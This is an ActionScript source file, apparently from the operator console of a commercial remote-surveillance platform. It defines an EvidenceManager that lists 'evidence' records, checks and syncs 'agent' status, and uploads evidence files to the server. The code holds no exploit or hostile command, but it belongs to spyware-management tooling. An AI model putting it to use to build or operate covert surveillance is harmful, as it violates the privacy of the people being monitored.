package it.ht.rcs.console.evidence.controller
{
  import flash.events.Event;
  import flash.events.HTTPStatusEvent;
  import flash.events.IOErrorEvent;
  import flash.events.SecurityErrorEvent;
  import flash.filesystem.File;
  import flash.filesystem.FileMode;
  import flash.filesystem.FileStream;
  import flash.net.URLRequest;
  import flash.utils.ByteArray;
  
  import it.ht.rcs.console.DB;
  import it.ht.rcs.console.controller.ItemManager;
  import it.ht.rcs.console.events.FilterEvent;
  import it.ht.rcs.console.utils.AlertPopUp;
  import it.ht.rcs.console.utils.DateUtils;
  
  import mx.collections.ArrayCollection;
  import mx.collections.AsyncListView;
  import mx.collections.ISort;
  import mx.collections.ListCollectionView;
  import mx.core.FlexGlobals;
  import mx.events.CollectionEvent;
  import mx.rpc.events.FaultEvent;
  import mx.rpc.events.ResultEvent;

  
  public class EvidenceManager extends ItemManager
  {
    
    /* singleton */
    private static var _instance:EvidenceManager = new EvidenceManager();
    public static function get instance():EvidenceManager { return _instance; } 
    
    [Bindable]
    public var filter:Object = {};
    
    override public function refresh():void
    {
      super.refresh();
      //DB.instance.audit.filters(onFiltersResult);
      //if(!filter.hasOwnProperty('from'))
      //  setDefaultDate();
      DB.instance.evidence.all(filter, onResult);
    }
    
    private function onFiltersResult(event:ResultEvent):void
    {
      var e:FilterEvent = new FilterEvent(FilterEvent.FILTER_VALUES_CHANGED);
      e.filterValues = event.result;
      FlexGlobals.topLevelApplication.dispatchEvent(e);
    }
    
    private function onResult(e:ResultEvent):void
    {
      var alv:AsyncListView = new AsyncListView(e.result as ArrayCollection)
      alv.addEventListener(CollectionEvent.COLLECTION_CHANGE, onDataProviderChange);
      _view = new ListCollectionView(alv);
    }
    
    private function onFilterChanged(event:FilterEvent):void
    {
      refresh();
    }
    
    private function onDataProviderChange(event:CollectionEvent):void
    {
      _view.list.removeEventListener(CollectionEvent.COLLECTION_CHANGE, onDataProviderChange);
    }
    
    
    [Bindable]
    public var _view:ListCollectionView;
    
    override public function getView(sortCriteria:ISort=null, filterFunction:Function=null):ListCollectionView
    {
      super.getView(sortCriteria, filterFunction);
      return _view;
    }
    
    private function setDefaultDate():void
    {
      var today:Date = new Date();
      today.hours = today.minutes = today.seconds = today.milliseconds = 0;
      
      var from:Date = DateUtils.addDays(today, -5);
      filter.from = from.time / 1000;
      
      var to:Date = today;
      to.hours = 23; to.minutes = 59;
      filter.to = to.time / 1000;
    }
    
    

    public function sync(factory:String, instance:String, platform:String, version:String, user:String, device:String, onResult:Function = null):void
    {
      DB.instance.evidence.agent_status({ident: factory, instance: instance, subtype: platform}, function (event:ResultEvent):void {
                
        if (event.result.status == 'OPEN' && event.result.deleted == false) {
          // send the sync parameters
          DB.instance.evidence.sync_start({bid: event.result._id, user: user, device: device, sync_time: (new Date().time) / 1000}); 
          DB.instance.evidence.sync_stop({bid: event.result._id});

          onResult(event);
        } else {
          AlertPopUp.show("Invalid Agent Status, cannot import");
        }
      });
    }
    
    public function uploadEvidence(id:String, file:File, onResult:Function = null, onFault:Function = null):void
    {      
      file.addEventListener(Event.COMPLETE, onResult);
      file.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onFault);
      file.addEventListener(HTTPStatusEvent.HTTP_STATUS, onFault);
      file.addEventListener(IOErrorEvent.IO_ERROR, onFault);
      file.upload(new URLRequest(DB.hostAutocomplete(Console.currentSession.server) + "evidence/create/" + id), "content");
    }
    
  }
}